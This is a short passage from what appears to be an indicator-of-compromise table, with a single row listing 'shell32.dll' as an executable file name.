|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

